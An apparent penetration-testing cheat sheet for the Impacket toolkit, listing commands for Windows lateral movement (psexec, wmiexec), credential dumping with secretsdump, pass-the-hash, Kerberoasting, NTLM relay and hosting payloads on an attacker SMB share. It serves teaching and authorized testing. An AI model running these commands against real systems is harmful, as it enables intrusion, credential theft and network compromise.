Impacket is a powerful collection of Python classes and example scripts for interacting with network protocols — especially Microsoft network protocols (SMB, MSRPC, Kerberos, LDAP, TDS, etc.). It’s the swiss-army knife for Windows network enumeration, credential harvesting, lateral movement, and Kerberos attacks in CTFs and penetration tests.

---
## Core Syntax (Impacket script pattern)

```bash
<tool>.py [domain/][user][:pass]@<target> [flags]
```

### Common patterns:

- `DOMAIN/username:password@target` — domain account example  

- `username:password@target` — local account / no domain  

- `-no-pass` — empty password  

- `-hashes LM:NT` or `:NT` — pass-the-hash (supply NT hash)


---
## Authentication Methods
| Method                  | Syntax Example                                                                |     |
| ----------------------- | ----------------------------------------------------------------------------- | --- |
| Plaintext               | `psexec.py 'CORP\admin:Passw0rd@10.10.10.10'`                                 |     |
| Hashes (PTH)            | `secretsdump.py 'user@10.10.10.10' -hashes :aad3...:nt...`                    |     |
| Kerberos                | `GetUserSPNs.py 'CORP/enum:Pass' -request` (or use `-k` with existing ticket) |     |
| No password / anonymous | `smbclient.py 'WORKGROUP/guest@10.10.10.10'`                                  |     |

---
## SMB / File Ops (examples & expected outputs)

### Enumerate Shares

```bash
smbclient.py 'WORKGROUP/guest@10.10.10.10'
```

**Expected Output:**
```text
[*] Querying shares on 10.10.10.10

    ADMIN$

    C$

    Public
```
### Download File

```bash
smbclient.py 'CORP/alice:Passw0rd@10.10.10.10' -command 'get \Users\Public\loot.txt /tmp/loot.txt'
```
### Host files (serve payloads)

```bash
smbserver.py PWN /home/user/payloads

# Target can copy: copy \10.10.14.2\PWN\payload.exe C:\Temp\payload.exe
```

---
## Remote Code Execution & Lateral Movement

### psexec (service-based, reliable, noisy)


```bash
psexec.py 'CORP\Administrator:Passw0rd@10.10.10.10' cmd.exe
```

> Creates a temporary service on the target (Event ID 7045). Use for reliable interactive shells.

### wmiexec (WMI, stealthier — no service creation)

```bash
wmiexec.py 'CORP\svc:Password@10.10.10.10'
```
### Alternate RPC-based execs

```bash
smbexec.py 'user:pass@10.10.10.10'

atexec.py 'user:pass@10.10.10.10'

dcomexec.py 'user:pass@10.10.10.10'
```

> Try different exec methods if one fails — environments vary (DCOM, Task Scheduler, SMB).

---
## Credential Harvesting & Dumping
### secretsdump — remote or offline SAM/NTDS extraction

```bash
# Remote dump with creds
secretsdump.py 'CORP\Administrator:Passw0rd@10.10.10.10'

# Pass-the-hash mode (NT hash only)
secretsdump.py 'CORP\user@10.10.10.10' -hashes :0123456789abcdef...
```

**Output:** NTLM hashes, cached creds, and (when possible) LSA secrets suitable for offline cracking.

### samrdump / netview — lightweight enumeration

```bash
samrdump.py 'CORP\user:Pass@dc.corp.local'

netview.py 'CORP\user:Pass@10.10.10.10'
```


---
## Kerberos Attacks

### GetNPUsers — AS-REP Roasting (no preauth)


```bash
GetNPUsers.py 'CORP\user:Pass' -no-pass
```

- Finds accounts with `DONT_REQ_PREAUTH` and outputs hashes that can be cracked offline (hashcat john format).

### GetUserSPNs — Kerberoasting (TGS requests)

```bash
GetUserSPNs.py 'CORP\user:Pass' -request -outputfile spns.txt
```

- Enumerates accounts with SPNs, requests service tickets (TGS), saves crackable blobs for offline brute-forcing.

### Ticketer / Kerberos ticket ops (advanced)

- `ticketer.py` can craft TGT/TGS tickets in specific scenarios — use only when you understand Kerberos ticket internals.

---
## NTLM Relay & Responder Integration
### ntlmrelayx — relay captured NTLM auth to target services

```bash
# Relay to an SMB host
ntlmrelayx.py -t smb://10.10.10.100 --smb2support

# Relay using targets file & execute module
ntlmrelayx.py -tf targets.txt -smb2support --delegate-access
```

**Typical flow:** Run Responder/mitm6 to capture NTLM; run `ntlmrelayx` to relay to SMB/HTTP/MSSQL and obtain access.

---
## Database & Other Protocols
### mssqlclient — TDS / MSSQL interactive shell

```bash
mssqlclient.py 'sa:Pass@10.10.10.10'

# If xp_cmdshell is enabled and you have permissions, you can run OS commands from MSSQL.
```

### lookupsid — translate SIDs to accounts & enumerate groups

```bash
lookupsid.py 'CORP\user:Pass@dc.corp.local' S-1-5-21-...
```

---
## Modules & Scripts You Should Know

```bash
# List of high-value Impacket tools for CTFs/pentests:
smbclient.py, smbserver.py, psexec.py, wmiexec.py,

smbexec.py, atexec.py, dcomexec.py, secretsdump.py,

GetNPUsers.py, GetUserSPNs.py, ntlmrelayx.py,

mssqlclient.py, lookupsid.py, samrdump.py, netview.py,

ticketer.py
```

Common uses:

- `smbclient`, `smbserver` — file ops & payload hosting.  

- `psexec`, `wmiexec`, `smbexec` — lateral execution.  

- `secretsdump`, `samrdump` — credential harvesting.  

- `GetNPUsers`, `GetUserSPNs` — Kerberos offline cracking.  

- `ntlmrelayx` — NTLM relay attacks with Responder/mitm6.
---
## Impacket Cheatsheet

| Task            | Command Example                                                      |
| --------------- | -------------------------------------------------------------------- |
| Check SMB creds | `smbclient.py 'CORP\user:Pass@10.10.10.10'`                          |
| List shares     | `smbclient.py 'user:pass@10.10.10.10'`                               |
| Download file   | `smbclient.py 'user:pass@10.10.10.10' -command 'get \\C$\path file'` |
| Host payload    | `smbserver.py PWN /home/user/payloads`                               |
| RCE (psexec)    | `psexec.py 'CORP\Administrator:Pass@10.10.10.10' cmd.exe`            |
| RCE (wmiexec)   | `wmiexec.py 'user:Pass@10.10.10.10'`                                 |
| Dump hashes     | `secretsdump.py 'CORP\Administrator:Pass@10.10.10.10'`               |
| AS-REP roast    | `GetNPUsers.py 'CORP\user:Pass' -no-pass`                            |
| Kerberoast      | `GetUserSPNs.py 'CORP\user:Pass' -request`                           |
| NTLM relay      | `ntlmrelayx.py -t smb://10.10.10.100 --smb2support`                  |
| MSSQL shell     | `mssqlclient.py 'sa:Pass@10.10.10.10'`                               |

---
## Recommended Operator Workflow

```text
[0] Known creds? Try them against SMB/WinRM.

 ↓

[1] Enumerate shares & services (smbclient, netview).

 ↓

[2] If creds valid → attempt wmiexec (stealth) then psexec (reliable).

 ↓

[3] Dump credentials (secretsdump, samrdump).

 ↓

[4] Domain enum → Kerberos (GetNPUsers/GetUserSPNs) → offline crack.

 ↓

[5] Relay opportunities: run Responder/mitm6 → ntlmrelayx against targets.

 ↓

[6] Horizontal/vertical pivot; collect artifacts.

 ↓

[7] Cleanup & credential rotation.
```

> _Pro Tip:_ After first access, collect for BloodHound and harvest token/delegation material; prioritize persistence only when necessary and within rules of engagement.